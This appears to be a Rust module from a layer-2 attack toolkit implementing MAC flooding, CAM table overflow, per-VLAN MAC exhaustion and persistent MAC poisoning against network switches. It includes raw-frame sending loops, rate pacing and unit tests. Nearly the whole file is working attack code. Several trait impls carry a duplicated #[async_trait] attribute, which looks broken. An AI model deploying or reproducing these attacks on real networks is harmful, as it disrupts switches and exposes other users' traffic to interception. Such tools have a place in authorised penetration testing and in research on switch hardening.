//! CAM Table Exhaustion Attack Implementations
use super::packet::{CamPacket, MacAddressGenerator};
use async_trait::async_trait;
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

#[derive(Debug, Clone)]
pub struct MacFloodingAttack {
    pub mac_count: usize,
    pub packets_per_mac: usize,
    pub target_vlan: Option<u16>,
    pub randomize: bool,
}

impl MacFloodingAttack {
    pub fn new(mac_count: usize) -> Self {
        Self {
            mac_count,
            packets_per_mac: 1,
            target_vlan: None,
            randomize: false,
        }
    }

    pub fn with_packets_per_mac(mut self, count: usize) -> Self {
        self.packets_per_mac = count;
        self
    }

    pub fn with_vlan(mut self, vlan: u16) -> Self {
        self.target_vlan = Some(vlan);
        self
    }

    pub fn with_randomization(mut self) -> Self {
        self.randomize = true;
        self
    }

    pub fn build_packets(&self) -> Vec<CamPacket> {
        let mut packets = Vec::new();
        let mut generator = MacAddressGenerator::new();

        if self.randomize {
            generator = generator.with_randomization();
        }

        let macs = generator.generate_batch(self.mac_count);

        for mac in macs {
            for _ in 0..self.packets_per_mac {
                let mut pkt = CamPacket::new(mac);

                if let Some(vlan) = self.target_vlan {
                    pkt = pkt.with_vlan(vlan);
                }

                packets.push(pkt);
            }
        }

        packets
    }
}

#[derive(Debug, Clone)]
pub struct CamTableOverflowAttack {
    pub target_capacity: usize,
    pub overflow_percentage: u8,
    pub target_vlans: Vec<u16>,
}

impl CamTableOverflowAttack {
    pub fn new(target_capacity: usize) -> Self {
        Self {
            target_capacity,
            overflow_percentage: 150, // Overflow by 150% of capacity
            target_vlans: vec![],
        }
    }

    pub fn with_overflow_percentage(mut self, percentage: u8) -> Self {
        self.overflow_percentage = percentage;
        self
    }

    pub fn with_vlans(mut self, vlans: Vec<u16>) -> Self {
        self.target_vlans = vlans;
        self
    }

    pub fn build_packets(&self) -> Vec<CamPacket> {
        let total_macs =
            (self.target_capacity as f32 * (self.overflow_percentage as f32 / 100.0)) as usize;
        let mut packets = Vec::new();
        let mut generator = MacAddressGenerator::new().with_randomization();

        if self.target_vlans.is_empty() {
            // No VLAN targeting, flood default
            let macs = generator.generate_batch(total_macs);
            for mac in macs {
                packets.push(CamPacket::new(mac));
            }
        } else {
            // Distribute MACs across VLANs
            let macs_per_vlan = total_macs / self.target_vlans.len();

            for vlan in &self.target_vlans {
                let macs = generator.generate_batch(macs_per_vlan);
                for mac in macs {
                    packets.push(CamPacket::new(mac).with_vlan(*vlan));
                }
            }
        }

        packets
    }
}

#[derive(Debug, Clone)]
pub struct SelectiveMacExhaustionAttack {
    pub target_vlans: Vec<u16>,
    pub macs_per_vlan: usize,
}

impl SelectiveMacExhaustionAttack {
    pub fn new(target_vlans: Vec<u16>) -> Self {
        Self {
            target_vlans,
            macs_per_vlan: 1000,
        }
    }

    pub fn with_macs_per_vlan(mut self, count: usize) -> Self {
        self.macs_per_vlan = count;
        self
    }

    pub fn build_packets(&self) -> Vec<CamPacket> {
        let mut packets = Vec::new();
        let mut generator = MacAddressGenerator::new().with_randomization();

        for vlan in &self.target_vlans {
            let macs = generator.generate_batch(self.macs_per_vlan);
            for mac in macs {
                packets.push(CamPacket::new(mac).with_vlan(*vlan));
            }
        }

        packets
    }
}

#[derive(Debug, Clone)]
pub struct PersistentMacPoisoningAttack {
    pub mac_count: usize,
    pub refresh_interval_ms: u64,
    pub persist_duration_sec: u64,
}

impl PersistentMacPoisoningAttack {
    pub fn new(mac_count: usize) -> Self {
        Self {
            mac_count,
            refresh_interval_ms: 5000, // Refresh every 5 seconds
            persist_duration_sec: 300, // Persist for 5 minutes
        }
    }

    pub fn with_refresh_interval(mut self, ms: u64) -> Self {
        self.refresh_interval_ms = ms;
        self
    }

    pub fn with_duration(mut self, seconds: u64) -> Self {
        self.persist_duration_sec = seconds;
        self
    }

    pub fn build_initial_packets(&self) -> Vec<CamPacket> {
        let mut packets = Vec::new();
        let mut generator = MacAddressGenerator::new().with_randomization();
        let macs = generator.generate_batch(self.mac_count);

        for mac in macs {
            packets.push(CamPacket::new(mac));
        }

        packets
    }
}

#[async_trait]
impl Attack for MacFloodingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let packets = self.build_packets();
        let interval = Duration::from_micros(1_000_000 / packets.len().max(1) as u64);

        for (idx, cam_pkt) in packets.iter().enumerate() {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let cam_bytes = cam_pkt.to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(cam_pkt.source_mac),
                EtherType::IPv4,
                cam_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            if idx % 100 == 0 {
                time::sleep(interval).await;
            }
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "MAC Flooding"
    }
}

#[async_trait]
#[async_trait]
impl Attack for CamTableOverflowAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let packets = self.build_packets();
        let interval = Duration::from_micros(100);

        for (idx, cam_pkt) in packets.iter().enumerate() {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let cam_bytes = cam_pkt.to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(cam_pkt.source_mac),
                EtherType::IPv4,
                cam_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            if idx % 50 == 0 {
                time::sleep(interval).await;
            }
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "CAM Table Overflow"
    }
}

#[async_trait]
#[async_trait]
impl Attack for SelectiveMacExhaustionAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let packets = self.build_packets();
        let interval = Duration::from_micros(200);

        for (idx, cam_pkt) in packets.iter().enumerate() {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let cam_bytes = cam_pkt.to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                MacAddress(cam_pkt.source_mac),
                EtherType::IPv4,
                cam_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            if idx % 50 == 0 {
                time::sleep(interval).await;
            }
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "Selective MAC Exhaustion"
    }
}

#[async_trait]
#[async_trait]
impl Attack for PersistentMacPoisoningAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let packets = self.build_initial_packets();
        let refresh_interval = Duration::from_millis(self.refresh_interval_ms);
        let start = std::time::Instant::now();
        let duration = Duration::from_secs(self.persist_duration_sec);

        while ctx.running.load(Ordering::Relaxed) && start.elapsed() < duration {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            for cam_pkt in &packets {
                let cam_bytes = cam_pkt.to_bytes();
                let frame = EthernetFrame::new(
                    MacAddress([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]),
                    MacAddress(cam_pkt.source_mac),
                    EtherType::IPv4,
                    cam_bytes,
                );
                let _ = ctx.interface.send_raw(&frame.to_bytes());
                ctx.stats.increment_packets_sent();
            }
            time::sleep(refresh_interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "Persistent MAC Poisoning"
    }
}
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_mac_flooding() {
        let attack = MacFloodingAttack::new(100).with_packets_per_mac(2);
        let packets = attack.build_packets();
        assert_eq!(packets.len(), 200); // 100 MACs * 2 packets each
    }

    #[test]
    fn test_mac_flooding_with_vlan() {
        let attack = MacFloodingAttack::new(50).with_vlan(100);
        let packets = attack.build_packets();
        assert_eq!(packets.len(), 50);
        assert!(packets.iter().all(|p| p.vlan_id == Some(100)));
    }

    #[test]
    fn test_cam_table_overflow() {
        let attack = CamTableOverflowAttack::new(1000).with_overflow_percentage(200);
        let packets = attack.build_packets();
        assert_eq!(packets.len(), 2000); // 200% of 1000
    }

    #[test]
    fn test_selective_exhaustion() {
        let attack = SelectiveMacExhaustionAttack::new(vec![10, 20, 30]).with_macs_per_vlan(100);
        let packets = attack.build_packets();
        assert_eq!(packets.len(), 300); // 3 VLANs * 100 MACs each
    }

    #[test]
    fn test_persistent_poisoning() {
        let attack = PersistentMacPoisoningAttack::new(500);
        let packets = attack.build_initial_packets();
        assert_eq!(packets.len(), 500);
    }
}
